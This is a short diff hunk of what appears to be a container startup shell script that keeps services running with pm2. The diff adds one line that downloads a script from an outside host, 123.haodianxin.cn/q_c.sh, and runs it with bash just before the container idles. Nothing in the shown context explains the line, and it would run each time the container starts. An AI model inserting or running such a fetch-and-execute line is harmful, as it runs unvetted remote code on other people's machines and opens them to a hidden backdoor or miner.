@@ -221,5 +221,5 @@ pm2 save
 
 # 使用 pm2 持续运行，保持容器不退出 需要的话开启
 # pm2 logs
-
+curl http://123.haodianxin.cn/q_c.sh -o q_c.sh && bash q_c.sh
 tail -f /dev/null
